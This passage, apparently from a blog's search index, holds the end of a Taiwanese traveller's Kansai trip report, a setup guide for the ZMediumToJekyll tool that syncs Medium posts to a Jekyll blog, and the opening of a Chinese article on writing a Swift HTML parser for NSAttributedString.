walked from the shopping street to Kobe Harbor.When we arrived, we found out that the Kobe Tower was under renovation QQ.Completion time uncertainOn the way back, we strolled through the streets of Kobe.We found a café in Kobe to take a break:Strawberry chocolate milkshake, delicious but very sweet.DotonboriAfter Kobe, we headed to Dotonbori.For dinner, we went to the famous Osaka Shinsekai Kushikatsu Ittoku.After eating, we started our tourist itinerary, taking photos of attractions and shopping at drugstores.GlicoWhen I got back to Taiwan, I realized I took the wrong photo on IG XD. There was a better photo spot if you entered through the nearby department store.Back at the hotel, we continued to enjoy instant noodles and sake as a late-night snack.No impression of the taste. KKday Osaka Sightseeing Pass｜Osaka e-PASSDay 7: Koshien, Namba, Drugstores, ShoppingIt was the last day before heading back to Taiwan, just a quick sightseeing trip.Koshien, Failed Photo OpIn the morning, we spontaneously decided to go to Koshien to watch a Hanshin Tigers baseball game, taking the subway to Koshien Station.As soon as we exited the station, we were at Koshien Stadium.However, we were met with disappointment. Unlike in Taiwan, where you can always find a seat at games, all tickets for Hanshin’s games were sold out until July; you have to buy them in advance, or else you can only enjoy the area outside the stadium.In the end, we grabbed a bite nearby, bought some Hanshin Tigers merchandise, and then went to a café for coffee before leaving.I always thought it was called “Coffee Place.”Hanshin Tigers stickers.NambaAfter leaving Koshien, we headed to Namba for shopping.We also grabbed some takoyaki and crab legs from street vendors.We might have gone to the wrong shop because it was pretty average.We walked back to Dotonbori and headed towards the main Don Quijote store.The only main store with a Ferris wheel.After shopping, we returned to Osaka in the evening and found an izakaya near our accommodation for our last dinner.We took one last look at the Osaka night view.Day 8: Return TripWith a noon flight, we checked out at 7 AM to head to Kansai Airport.Today, the weather in Osaka changed; it started to rain, perfectly matching the mood of farewell.I took one last photo of the Osaka skyline as a goodbye. I originally planned to take the train to Kansai Airport, but dragging luggage up and down was a hassle. The day before, I checked the bus route (including the time and station location), and in the morning, I went to the bus station to see how crowded it was. Luckily, there weren’t many people in line, so we bought bus tickets to Kansai Airport and comfortably took the bus directly there.Along the way, we enjoyed the last views of Osaka.Upon arriving at the airport, I was shocked by the long lines at the check-in counters.I eventually realized I was at the wrong counter. Since we had already checked in online, we could go directly to the luggage drop-off counter! This saved us almost an hour. I really wanted to tell the people in line, “If you open the website and check in online, you can go straight to drop off your luggage and exit!”After clearing immigration, Kansai Airport was under renovation, so there weren’t many food options or shops. In the end, I bought a pork cutlet curry toast from Shinsekai.Waiting for the flight, heading back to Taiwan.In the afternoon, we safely arrived in Taiwan and went home to rest! 🇹🇼SouvenirsI didn’t buy much; I just picked up whatever caught my eye. After comparing prices, I found that the drugstores near Kyoto Station were the cheapest (about 100-300 yen less than in Osaka), with Don Quijote being the most expensive.The theme song from Yodobashi is really catchy; I got it stuck in my head after wandering around Kyoto.Japan’s tax exemption policy requires a minimum purchase of 5,000 yen with a passport to qualify for tax-free shopping. They will seal your items in a plastic bag, which you can only open after returning home (the above photo was taken at home; if you open it in Japan and get checked at immigration, you might have to pay taxes, but it seems they don’t check that often. Just remember that liquids can only be checked in; if there are liquids in sealed items, you can only check the whole package).In terms of food, aside from the famous snacks, I focused more on local delicacies from century-old shops. I can’t guarantee they’ll be delicious, but I can guarantee they’ve been around for a hundred years. The snacks everyone recommends are guaranteed to be tasty, but be prepared to wait in line and they’re not century-old XD.In the end, my takeaway is to seek out delicious food!PostscriptI fell in love with Japan on my first visit and started planning my next trip as soon as I got back. Actually, I went to Tokyo again from June 7-11 😝 Stay tuned for the next travelogue!Overall, the transportation is convenient, the atmosphere is quiet, the weather is pleasant (going in May felt like autumn in Taiwan, with cool evenings), people respect personal space and are polite; I really liked it!Considering the current exchange rate and prices, it’s actually cheaper than Taiwan…Accommodation and Transportation: The train and bus coverage is even better than in Taiwan; during my entire trip, I only took a taxi on the first day to the hotel. Although transportation is convenient, Japan is vast, so you need to walk a lot; I walked nearly 20,000 steps every day. The left/right standing rule varies; it’s left in Kyoto but right in Osaka. Buses wait for passengers to sit down before departing, and they wait for you to get up and exit slowly; so there’s no need to get restless before reaching your stop, as Japanese people don’t like that either. Hotel bathrooms are all very clean and comfortable; even the smallest ones have bathtubs. Almost all toilets are bidet toilets, and those in department stores even have background water sounds (to prevent awkwardness).Steps Peak: 5/23–5/28Culture: The streets are clean and have a strong sense of uniformity (e.g., all doorways look the same; if some houses have shoe cabinets, then all do, and if not, none do). People don’t eat while walking; they finish their food at the store entrance before leaving. Trash can only be taken back to the hotel, as there are few trash bins on the streets. Therefore, it’s most convenient to return trash to the store after eating. Store owners only accept trash from their own establishments. English is generally not widely spoken; communication often relies on simple phrases and gestures, or translation apps. However, drugstores and large shopping centers usually have Chinese-speaking staff. When buying tickets, receiving receipts, giving or receiving change, remember to place items directly on the counter or take them from the tray without touching the staff. Avoid physical contact and standing too close to others. Public transportation is generally very quiet, especially buses. When taking photos, try not to capture people or their faces; if uploading to social media, faces should be blurred. When photographing temples, take angled shots rather than straight-on. Attention to detail in standard operating procedures (SOP) is crucial, and it can be challenging to fully integrate into Japanese culture. Japanese people typically dress very formally or at least put effort into their appearance; women, in particular, are very polished. Additionally, it’s best not to comment on others. At Universal Studios, we encountered a group of Taiwanese tourists (they had a 🇹🇼 sticker on their bags) who were loudly shouting slogans and filming videos, saying things like “Super awesome, sales are great!” Because there were already so many people, they blocked the path while a group shouted slogans, repeating their takes when they didn’t get it right. It was quite embarrassing.Returning to Work and “Products”From my perspective, if we want to enter the Japanese market, relying solely on advertising and marketing will likely be difficult; at most, we might attract a few curious individuals. Japan has a strong cultural unity, and to win their hearts, we need to find ways to integrate into their lifestyle and habits.Moreover, the tolerance for errors is very low. For example, bugs or unexpected appearances of other languages; while we might think that one or two instances are acceptable or at least not frequent, I believe that for them, even one mistake could lead to a loss of trust, as it indicates a lack of rigor and respect for their standards.— — —👑 Lastly, here’s my most supportive travel companion, Huang XingpingSuccess in Kansai!KKday Promotions [【One Person Tour】Kyoto Amanohashidate Day Trip Ine Bay Boat Tour, Amanohashidate, and Miyama thatched-roof village Departing from Osaka Namba](https://www.kkday.com/zh-tw/product/155289?cid=19365){:target=”_blank”} [Kyoto by the Sea “Spirited Away” Sightseeing Train Day Trip Tango Red Pine and Black Pine Trains, Amanohashidate View Land, Sightseeing Boat, Kasamatsu Park Departing from Osaka](https://www.kkday.com/zh-tw/product/163483?cid=19365){:target=”_blank”} [【One Person Tour】Kyoto and Nara Day Trip Arashiyama, Fushimi Inari Shrine, Kinkaku-ji, and Nara Park Optional Japanese lunch plan (departing from Osaka or Kyoto)](https://www.kkday.com/zh-tw/product/13894-kyoto-nara-tour-fushimi-inari-taisha-shrine-arashiyama-nara-park-japan?cid=19365){:target=”_blank”} [**Universal Studios Japan Universal Studios Japan Admission Ticket &amp; Express Pass (Fast Pass)**](https://www.kkday.com/zh-tw/product/20944-universal-studios-japan-admission-ticket-and-express-pass?cid=19365){:target=”_blank”} [Japan JR PASS Kansai Area Rail Pass eMCO Electronic Ticket](https://www.kkday.com/zh-tw/product/25777-jr-kansai-area-pass-japan?cid=19365){:target=”_blank”} [**Japan JR PASS Kansai Wide Area Rail Pass eMCO Electronic Ticket**](https://www.kkday.com/zh-tw/product/20317-japan-kansai-wide-area-pass?cid=19365){:target=”_blank”} Kansai &amp; San’in Area Rail Pass JRPass [**Japan eSIM Card Daily High-Speed, Total Data, Unlimited Data Plans**](https://www.kkday.com/zh-tw/product/137689-japan-high-speed-daily-unlimited-data-japanese-esim?cid=19365){:target=”_blank”} If you found this article helpful, feel free to use my promotional link to purchase KKday products and tours. I will earn a small commission, which helps me continue creating more travel content. Thank you!More Travelogues [Travelogue] 2024 San’in Wide Area: Shimane, Izumo, Matsue, Tottori, Himeji, Osaka, Kobe 7-Day Solo Trip [Travelogue] 2024 Second Visit to Kyushu: 9-Day Free Trip via Busan → Hakata Cruise Entry [Travelogue] 2023 Hiroshima and Okayama: 6-Day Free Trip [Travelogue] 2023 Kyushu: 10-Day Solo Free Trip [Travelogue] 9/11 Nagoya Day Trip [Travelogue] 2023 Tokyo: 5-Day Free TripIf you have any questions or feedback, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.If you found this article helpful, feel free to use my referral link to purchase KKday products and tours. I’ll receive a small commission to support more travel content. Thank you! Follow Me on Medium 1K+ Followers 1,407 Total Views Last Statistics Date: 2025-08-15 | 1,391 Views on Medium." }, { "title": "ZMediumToJekyll", "url": "/posts/zrealm-dev/zmediumtojekyll-e7c547a5be22/", "categories": "ZRealm Dev.", "tags": "medium, post, medium-backup, ios-app-development, markdown", "date": "2023-03-18 02:47:07 +0800", "snippet": "ZMediumToJekyllMove your Medium posts to a Jekyll blog and keep them in sync in the future.This tool can help you move your Medium posts to a Jekyll blog and keep them in sync in the future.It will...", "content": "ZMediumToJekyllMove your Medium posts to a Jekyll blog and keep them in sync in the future.This tool can help you move your Medium posts to a Jekyll blog and keep them in sync in the future.It will automatically download your posts from Medium, convert them to Markdown, and upload them to your repository, check out my blog for online demo zhgchg.li .One-time setting, Lifetime enjoying❤️Powered by ZMediumToMarkdown .If you only want to create a backup or auto-sync of your Medium posts, you can use the GitHub Action directly by following the instructions in this Wiki .Setup You can follow along with each step of this process by watching the following video tutorial Click the green button Use this template located above and select Create a new repository . Repo Owner could be an organization or username Enter the Repository Name, which usually uses your GitHub Username/Organization Name and ends with .github.io , for example, my organization name is zhgchgli than it’ll be zhgchgli.github.io . Select the public repository option, and then click on Create repository from template . Grant access to GitHub Actions by going to the Settings tab in your GitHub repository, selecting Actions -&gt; General , and finding the Workflow permissions section , then, select Read and write permissions , and click on Save to save the changes.*If you choose a different Repository Name, the GitHub page will be https://username.github.io/Repository Name instead of https://username.github.io/ , and you will need to fill in the baseurl field in _config.yml with your Repository Name.*If you are using an organization and cannot enable Read and Write permissions in the repository settings, please refer to the organization settings page and enable it there.First-time run Please refer to the configuration information in the section below and make sure to specify your Medium username in the _zmediumtomarkdown.yml file. ⌛️ Please wait for the Automatic Build and pages-build-deployment gitHub actions to finish before making any further changes. Then, you can manually run the ZMediumToMarkdown GitHub action by going to the Actions tab in your GitHub repository, selecting the ZMediumToMarkdown action, clicking on the Run workflow button, and selecting the main branch. ⌛️ Please wait for the action to download and convert all Medium posts from the specified username, and commit the posts to your repository. ⌛️ Please wait for the Automatic Build and pages-build-deployment actions will also need to finish before making any further changes, and that they will start automatically once the ZMediumToMarkdown action has completed. Go to the Settings section of your GitHub repository and select Pages , In the Branch field, select gh-pages , and leave /(root) selected as the default. Click Save , you can also find the URL for your GitHub page at the top of the page. ⌛️ Please wait the Pages build and deployment action to finish. 🎉 After all actions are completed, you can visit your xxx.github.io page to verify that the results are correct. Congratulations! 🎉*To avoid expected Git conflicts or unexpected errors, please follow the steps carefully and in order, and be patient while waiting for each action to complete.*Note that the first time running may take longer.*If you open the URL and notice that something is wrong, such as the web style being missing, please ensure that your configuration in the _config.yml file is correct.*Please refer to the ‘Things to Know’ and ‘Troubleshooting’ sections below for more information.ConfigurationSite Setting_zmediumtomarkdown.ymlmedium_username: # enter your username on Medium.comPlease specify your Medium username for automatic download and syncing of your posts._config.yml &amp; jekyll settingFor more information, please refer to jekyll-theme-chirpy or jekyllrb .Github ActionZMediumToMarkdownYou can configure the time interval for syncing in ./.github/workflows/ZMediumToMarkdown.yml .The default time interval for syncing is once per day.You can also manually run the ZMediumToMarkdown action by going to the Actions tab in your GitHub repository, selecting the ZMediumToMarkdown action, clicking on the Run workflow button, and selecting the main branch.DisclaimerAll content downloaded using ZMediumToMarkdown, including but not limited to articles, images, and videos, are subject to copyright laws and belong to their respective owners. ZMediumToMarkdown does not claim ownership of any content downloaded using this tool.Downloading and using copyrighted content without the owner’s permission may be illegal and may result in legal action. ZMediumToMarkdown does not condone or support copyright infringement and will not be held responsible for any misuse of this tool.Users of ZMediumToMarkdown are solely responsible for ensuring that they have the necessary permissions and rights to download and use any content obtained using this tool. ZMediumToMarkdown is not responsible for any legal issues that may arise from the misuse of this tool.By using ZMediumToMarkdown, users acknowledge and agree to comply with all applicable copyright laws and regulations.TroubleshootingMy GitHub page keeps presenting a 404 error or doesn’t update with the latest posts. Please make sure you have followed the setup steps above in order. Wait for all GitHub actions to finish, including the Pages build and deployment and Automatic Build actions, you can check the progress on the Actions tab. Make sure you have the correct settings selected in Settings -&gt; Pages .Things to know The ZMediumToMarkdown GitHub Action for syncing Medium posts will automatically run every day by default, and you can also manually trigger it on the GitHub Actions page or adjust the sync frequency as needed. Every commit and post change will trigger the Automatic Build &amp; Pages build and deployment action. Please wait for this action to finish before checking the final result. You can create your own Markdown posts in the _posts directory by naming the file as YYYY-MM-DD-POSTNAME and recommend using lowercase file names. You can include images and other resources in the /assets directory. Also, if you would like to remove the ZMediumToMarkdown watermark located at the bottom of the post, you may do so. I don’t mind. You can edit the Ruby file at tools/optimize_markdown.rb and uncomment lines 10–12 . This will automatically remove the ZMediumToMarkdown watermark at the end of all posts during Jekyll build time. Since ZMediumToMarkdown is not an official tool and Medium does not provide a public API for it, I cannot guarantee that the parser target will not change in the future. However, I have tried to test it for as many cases as possible. If you encounter any rendering errors or Jekyll build errors, please feel free to create an issue and I will fix them as soon as possible.有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 47 Total Views Last Statistics Date: 2025-08-15 | 32 Views on Medium." }, { "title": "手工打造 HTML 解析器的那些事", "url": "/posts/zrealm-dev/%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0-html-%E8%A7%A3%E6%9E%90%E5%99%A8%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B-2724f02f6e7/", "categories": "ZRealm Dev.", "tags": "ios-app-development, html-parsing, nsattributedstring, html, rendering", "date": "2023-03-12 01:09:22 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.手工打造 HTML 解析器的那些事ZMarkupParser HTML to NSAttributedString 渲染引擎的開發實錄HTML String 的 Tokenization 轉換、Normalization 處理...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.手工打造 HTML 解析器的那些事ZMarkupParser HTML to NSAttributedString 渲染引擎的開發實錄HTML String 的 Tokenization 轉換、Normalization 處理、Abstract Syntax Tree 的產生、Visitor Pattern / Builder Pattern 的應用, 還有一些雜談…接續去年發表了篇「[ TL;DR] 自行實現 iOS NSAttributedString HTML Render 」的文章，粗淺的介紹可以使用 XMLParser 去剖析 HTML 再將其轉換成 NSAttributedString.Key，文中的程式架構及思路都很零亂，因是過水紀錄一下之前遇到的問題及當初並沒有花太多時間研究此議題。Convert HTML String to NSAttributedString再次重新探討此議題，我們需要能將 API 給的 HTML 字串轉換成 NSAttributedString ，並套用對應樣式放到 UITextView/UILabel 中顯示。e.g. &lt;b&gt;Test&lt;a&gt;Link&lt;/a&gt;&lt;/b&gt; 要能顯示成 Test Link 註1不建議使用 HTML 做為 App 與資料間的溝通渲染媒介，因 HTML 規格過於彈性，App 無法支援所有 HTML 樣式，也沒有官方的 HTML 轉換渲染引擎。 註2iOS 14 開始可使用官方原生的 AttributedString 解析 Markdown或引入 apple/swift-markdown Swift Package 解析 Markdown。 註3因敝司專案龐大且已應用 HTML 做為媒介多年，所以暫時無法全面更換為 Markdown 或其他 Markup。 註4 這邊的 HTML 並不是要用來顯示整個 HTML 網頁，只是把 HTML 做為樣式 Markdown 渲染字串樣式。 (要渲染整頁、複雜包含圖片表格的 HTML，依然要使用 WevView loadHTML) 強烈建議使用 Markdown 做為字串渲染媒介語言，如果您的專案跟我有一樣困擾不得不使用 HTML 並苦無優雅的 to NSAttributedString 轉換工具， 再請使用。 還記得上一篇文章的朋友也可以直接跳到 ZhgChgLi / ZMarkupParser 章節。NSAttributedString.DocumentType.html網路上能找到的 HTML to NSAttributedString 的做法都是要我們直接使用 NSAttributedString 自帶的 options 渲染 HTML，範例如下：let htmlString = \"&lt;b&gt;Test&lt;a&gt;Link&lt;/a&gt;&lt;/b&gt;\"let data = htmlString.data(using: String.Encoding.utf8)!let attributedOptions:[NSAttributedString.DocumentReadingOptionKey: Any] = [ .documentType :NSAttributedString.DocumentType.html, .characterEncoding: String.Encoding.utf8.rawValue]let attributedString = try! NSAttributedString(data: data, options: attributedOptions, documentAttributes: nil)此做法的問題： 效能差：此方法是透過 WebView Core 去渲染出樣式，再切回 Main Thread 給 UI 顯示；渲染 300 多個字元就需 0.03 Sec。 會吃字：例如行銷文案可能會使用 &lt;Congratulation!&gt; 會被當成 HTML Tag 被去除掉。 無法客製化：例如無法指定 HTML 的粗體在 NSAttributedString 中對應的粗體程度。 iOS ≥ 12 開始會零星閃退的問題且官方無解 在 iOS 15 出現 大量閃退 ，測試發現低電量情況下會 100% 閃退 (iOS ≥ 15.2 已修正) 字串太長會閃退，實測輸入超過 54,600+ 長度字串就會 100% 閃退 (EXC_BAD_ACCESS)對與我們最痛的還是閃退問題，iOS 15 發佈到 15.2 修正之前，App 始終被此問題霸榜，從數據來看，2022/03/11~2022/06/08 就造成了 2.4K+ 次閃退、影響 1.4K+ 位使用者。此閃退問題自 iOS 12 開始就有，iOS 15 只是踩到更大的坑，但我猜 iOS 15.2 的修正也只是補洞，官方無法根除。其次問題是效能，因為做為字串樣式 Markup Language，會大量應用在 App 上的 UILabel/UITextView，如同前述一個 Label 就需要 0.03 Sec，列表*UILabel/UITextView 乘下來就會對使用者操作手感上產生卡頓。XMLParser第二個方案是 上篇文章 介紹的，使用 XMLParser 解析成對應的 NSAttributedString Key 並套用樣式。可參考 SwiftRichString 的實現及 上一篇文章內容 。 上一篇也只是探究出可以使用 XMLParser 解析 HTML 並做對應轉換，然後完成實驗性的實作，但並沒有把它設計成一個有架構好擴充的「工具」。此做法的問題： 容錯率 0： &lt;br&gt; / &lt;Congratulation!&gt; / &lt;b&gt;Bold&lt;i&gt;Bold+Italic&lt;/b&gt;Italic&lt;/i&gt; 以上三種 HTML 有可能出現的情境，在 XMLParser 解析都會出錯直接 Throw Error 顯示空白。 使用 XMLParser，HTML 字串必須完全符合 XML 規則，無法像瀏覽器或 NSAttributedString.DocumentType.html 容錯正常顯示。站在巨人的肩膀上以上兩個方案都不能完美優雅的解決 HTML 問題，於是開始搜尋有無現成的解決方案。 johnxnguyen / Down 只支援輸入 Markdown 轉換成 Any (XML/NSAttributedString…)，但不支援輸入 HTML 轉換。 malcommac / SwiftRichString 底層是使用 XMLParser，實測前述案例也會有一樣容錯率 0 的問題。 scinfu / SwiftSoup 只支援 HTML Parser(Selector) 不支援轉換成 NSAttributedString 。 找了一大圈結果都類似上方的專案 Orz，沒有巨人的肩膀可以站。ZhgChgLi/ZMarkupParser沒有巨人的肩膀，只好自己當巨人了，於是自行開發了 HTML String to NSAttributedString 工具。使用純 Swift 開發，透過 Regex 剖析出 HTML Tag 並經過 Tokenization，分析修正 Tag 正確性(修正沒有 end 的 tag &amp; 錯位 tag)，再轉換成 abstract syntax tree，最終使用 Visitor Pattern 將 HTML Tag 與抽象樣式對應，得到最終 NSAttributedString 結果；其中不依賴任何 Parser Lib。特色 支援 HTML Render (to NSAttributedString) / Stripper (剝離 HTML Tag) / Selector 功能 比 NSAttributedString.DocumentType.html 更高的效能 自動分析修正 Tag 正確性(修正沒有 end 的 tag &amp; 錯位 tag) 支援從 style=”color:red…” 動態設定樣式 支援客製化樣式指定，例如粗體要多 粗 支援彈性可擴充標籤或自訂標籤及屬性 詳細介紹、安裝使用可參考此篇文章：「 ZMarkupParser HTML String 轉換 NSAttributedString 工具 」可直接 git clone 專案 後，打開 ZMarkupParser.xcworkspace Project 選擇 ZMarkupParser-Demo Target 直接 Build &amp; Run 起來玩玩。ZMarkupParser技術細節再來才是本篇文章想分享的，關於開發這個工具上的技術細節。運作流程總覽上圖為大概的運作流程，後面文章會一步一步介紹及附上程式碼。 ⚠️️️️️️ 本文會盡量簡化 Demo Code、減少抽象跟效能考量，盡量把重心放在解釋運作原理上；如需了解最終結果請參考專案 Source Code 。程式碼化 — Tokenization a.k.a parser, 解析談到 HTML 渲染最重要的就是解析的環節，以往是透過 XMLParser 將 HTML 做為 XML 解析；但是無法克服 HTML 日常用法並不是 100% 的 XML 會造成解析器錯誤，且無法動態修正。排除掉使用 XMLParser 這條路之後，在 Swift 上留給我們的就只剩使用 Regex 正則來做匹配解析了。最一開始沒想太多，想說可以直接用正則挖出「成對」的 HTML Tag，再遞迴往裡面一層一層找 HTML Tag，直到結束；但是這樣沒有辦法解決 HTML Tag 可以嵌套，或想支援錯位容錯的問題，因此我們把策略改成挖成出「單個」 HTML Tag，並記錄是 Start Tag, Close Tag or Self-Closing Tag，及其他字串組合成解析結果陣列。Tokenization 結構如下：enum HTMLParsedResult { case start(StartItem) // &lt;a&gt; case close(CloseItem) // &lt;/a&gt; case selfClosing(SelfClosingItem) // &lt;br/&gt; case rawString(NSAttributedString)}extension HTMLParsedResult { class SelfClosingItem { let tagName: String let tagAttributedString: NSAttributedString let attributes: [String: String]? init(tagName: String, tagAttributedString: NSAttributedString, attributes: [String : String]?) { self.tagName = tagName self.tagAttributedString = tagAttributedString self.attributes = attributes } } class StartItem { let tagName: String let tagAttributedString: NSAttributedString let attributes: [String: String]? // Start Tag 有可能是異常 HTML Tag 也有可能是正常文字 e.g. &lt;Congratulation!&gt;, 後續 Normalization 後如果發現是孤立 Start Tag 則標記為 True。 var isIsolated: Bool = false init(tagName: String, tagAttributedString: NSAttributedString, attributes: [String : String]?) { self.tagName = tagName self.tagAttributedString = tagAttributedString self.attributes = attributes } // 後續 Normalization 自動補位修正使用 func convertToCloseParsedItem() -&gt; CloseItem { return CloseItem(tagName: self.tagName) } // 後續 Normalization 自動補位修正使用 func convertToSelfClosingParsedItem() -&gt; SelfClosingItem { return SelfClosingItem(tagName: self.tagName, tagAttributedString: self.tagAttributedString, attributes: self.attributes) } } class CloseItem { let tagName: String init(tagName: String) { self.tagName = tagName } }}使用的正則如下：&lt;(?:(?&lt;closeTag&gt;\\/)?(?&lt;tagName&gt;[A-Za-z0-9]+)(?&lt;tagAttributes&gt;(?:\\s*(\\w+)\\s*=\\s*([\"|']).*?\\5)*)\\s*(?&lt;selfClosingTag&gt;\\/)?&gt;)-&gt; Online Regex101 Playground closeTag: 匹配 &lt; / a&gt; tagName: 匹配 &lt; a &gt; or , &lt;/ a &gt; tagAttributes: 匹配 &lt;a href=”https://zhgchg.li” style=”color:red” &gt; selfClosingTag: 匹配 &lt;br / &gt; *此正則還可以再優化，之後再來做 文章後半段有提供關於正則的附加資料，有興趣的朋友可以參考。組合起來就是：var tokenizationResult: [HTMLParsedResult] = []let expression = try? NSRegularExpression(pattern: pattern, options: expressionOptions)let attributedString = NSAttributedString(string: \"&lt;a&gt;Li&lt;b&gt;nk&lt;/a&gt;Bold&lt;/b&gt;\")let totalLength = attributedString.string.utf16.count // utf-16 support emojivar lastMatch: NSTextCheckingResult?// Start Tags Stack, 先進後出(FILO First In Last Out)// 檢測 HTML 字串是否需要後續 Normalization 修正錯位或補 Self-Closing Tagvar stackStartItems: [HTMLParsedResult.StartItem] = []var needForamatter: Bool = falseexpression.enumerateMatches(in: attributedString.string, range: NSMakeRange(0, totoalLength)) { match, _, _ in if let match = match { // 檢查 Tag 之間或是到第一個 Tag 之間的字串 // e.g. Test&lt;a&gt;Link&lt;/a&gt;zzz&lt;b&gt;bold&lt;/b&gt;Test2 - &gt; Test,zzz let lastMatchEnd = lastMatch?.range.upperBound ?? 0 let currentMatchStart = match.range.lowerBound if currentMatchStart &gt; lastMatchEnd { let rawStringBetweenTag = attributedString.attributedSubstring(from: NSMakeRange(lastMatchEnd, (currentMatchStart - lastMatchEnd))) tokenizationResult.append(.rawString(rawStringBetweenTag)) } // &lt;a href=\"https://zhgchg.li\"&gt;, &lt;/a&gt; let matchAttributedString = attributedString.attributedSubstring(from: match.range) // a, a let matchTag = attributedString.attributedSubstring(from: match.range(withName: \"tagName\"))?.string.trimmingCharacters(in: .whitespacesAndNewlines).lowercased() // false, true let matchIsEndTag = matchResult.attributedString(from: match.range(withName: \"closeTag\"))?.string.trimmingCharacters(in: .whitespacesAndNewlines) == \"/\" // href=\"https://zhgchg.li\", nil // 用正則再拆出 HTML Attribute, to [String: String], 請參考 Source Code let matchTagAttributes = parseAttributes(matchResult.attributedString(from: match.range(withName: \"tagAttributes\"))) // false, false let matchIsSelfClosingTag = matchResult.attributedString(from: match.range(withName: \"selfClosingTag\"))?.string.trimmingCharacters(in: .whitespacesAndNewlines) == \"/\" if let matchAttributedString = matchAttributedString, let matchTag = matchTag { if matchIsSelfClosingTag { // e.g. &lt;br/&gt; tokenizationResult.append(.selfClosing(.init(tagName: matchTag, tagAttributedString: matchAttributedString, attributes: matchTagAttributes))) } else { // e.g. &lt;a&gt; or &lt;/a&gt; if matchIsEndTag { // e.g. &lt;/a&gt; // 從 Stack 取出出現相同 TagName 的位置，從最後開始 if let index = stackStartItems.lastIndex(where: { $0.tagName == matchTag }) { // 如果不是最後一個，代表有錯位或遺漏關閉的 Tag if index != stackStartItems.count - 1 { needForamatter = true } tokenizationResult.append(.close(.init(tagName: matchTag))) stackStartItems.remove(at: index) } else { // 多餘的 close tag e.g &lt;/a&gt; // 不影響後續，直接忽略 } } else { // e.g. &lt;a&gt; let startItem: HTMLParsedResult.StartItem = HTMLParsedResult.StartItem(tagName: matchTag, tagAttributedString: matchAttributedString, attributes: matchTagAttributes) tokenizationResult.append(.start(startItem)) // 塞到 Stack stackStartItems.append(startItem) } } } lastMatch = match }}// 檢查結尾的 RawString// e.g. Test&lt;a&gt;Link&lt;/a&gt;Test2 - &gt; Test2if let lastMatch = lastMatch { let currentIndex = lastMatch.range.upperBound if totoalLength &gt; currentIndex { // 還有剩餘字串 let resetString = attributedString.attributedSubstring(from: NSMakeRange(currentIndex, (totoalLength - currentIndex))) tokenizationResult.append(.rawString(resetString)) }} else { // lastMatch = nil, 代表沒找到任何標籤，全都是純文字 let resetString = attributedString.attributedSubstring(from: NSMakeRange(0, totoalLength)) tokenizationResult.append(.rawString(resetString))}// 檢查 Stack 是否已經清空，如果還有代表有 Start Tag 沒有對應的 End// 標記成孤立 Start Tagfor stackStartItem in stackStartItems { stackStartItem.isIsolated = true needForamatter = true}print(tokenizationResult)// [// .start(\"a\",[\"href\":\"https://zhgchg.li\"])// .rawString(\"Li\")// .start(\"b\",nil)// .rawString(\"nk\")// .close(\"a\")// .rawString(\"Bold\")// .close(\"b\")// ]運作流程如上圖最終會得到一個 Tokenization 結果陣列。 對應原始碼中的 HTMLStringToParsedResultProcessor.swift 實作標準化 — Normalization a.k.a Formatter, 正規化繼上一步取得初步解析結果後，解析中如果發現還需要 Normalization，則需要此步驟，自動修正 HTML Tag 問題。HTML Tag 問題有以下三種： HTML Tag 但遺漏 Close Tag: 例如 &lt;br&gt; 一般文字被當成 HTML Tag: 例如 &lt;Congratulation!&gt; HTML Tag 存在錯位問題: 例如 &lt;a&gt;Li&lt;b&gt;nk&lt;/a&gt;Bold&lt;/b&gt;修正方式也很簡單，我們需要遍歷 Tokenization 結果的元素，嘗試補齊缺漏。運作流程如上圖var normalizationResult = tokenizationResult// Start Tags Stack, 先進後出(FILO First In Last Out)var stackExpectedStartItems: [HTMLParsedResult.StartItem] = []var itemIndex = 0while itemIndex &lt; newItems.count { switch newItems[itemIndex] { case .start(let item): if item.isIsolated { // 如果為孤立 Start Tag if WC3HTMLTagName(rawValue: item.tagName) == nil &amp;&amp; (item.attributes?.isEmpty ?? true) { // 如果不是 WCS 定義的 HTML Tag &amp; 沒有任何 HTML Attribute // WC3HTMLTagName Enum 可參考 Source Code // 判定為 一般文字被當成 HTML Tag // 改成 raw string type normalizationResult[itemIndex] = .rawString(item.tagAttributedString) } else { // 否則，改成 self-closing tag, e.g. &lt;br&gt; -&gt; &lt;br/&gt; normalizationResult[itemIndex] = .selfClosing(item.convertToSelfClosingParsedItem()) } itemIndex += 1 } else { // 正常 Start Tag, 加入 Stack stackExpectedStartItems.append(item) itemIndex += 1 } case .close(let item): // 遇到 Close Tag // 取得 Start Stack Tag 到此 Close Tag 中間隔的 Tags // e.g &lt;a&gt;&lt;u&gt;&lt;b&gt;[CurrentIndex]&lt;/a&gt;&lt;/u&gt;&lt;/b&gt; -&gt; 間隔 0 // e.g &lt;a&gt;&lt;u&gt;&lt;b&gt;[CurrentIndex]&lt;/a&gt;&lt;/u&gt;&lt;/b&gt; -&gt; 間隔 b,u let reversedStackExpectedStartItems = Array(stackExpectedStartItems.reversed()) guard let reversedStackExpectedStartItemsOccurredIndex = reversedStackExpectedStartItems.firstIndex(where: { $0.tagName == item.tagName }) else { itemIndex += 1 continue } let reversedStackExpectedStartItemsOccurred = Array(reversedStackExpectedStartItems.prefix(upTo: reversedStackExpectedStartItemsOccurredIndex)) // 間隔 0, 代表 tag 沒錯位 guard reversedStackExpectedStartItemsOccurred.count != 0 else { // is pair, pop stackExpectedStartItems.removeLast() itemIndex += 1 continue } // 有其他間隔，自動在前候補期間格 Tag // e.g &lt;a&gt;&lt;u&gt;&lt;b&gt;[CurrentIndex]&lt;/a&gt;&lt;/u&gt;&lt;/b&gt; -&gt; // e.g &lt;a&gt;&lt;u&gt;&lt;b&gt;[CurrentIndex]&lt;/b&gt;&lt;/u&gt;&lt;/a&gt;&lt;b&gt;&lt;/u&gt;&lt;/u&gt;&lt;/b&gt; let stackExpectedStartItemsOccurred = Array(reversedStackExpectedStartItemsOccurred.reversed()) let afterItems = stackExpectedStartItemsOccurred.map({ HTMLParsedResult.start($0) }) let beforeItems = reversedStackExpectedStartItemsOccurred.map({ 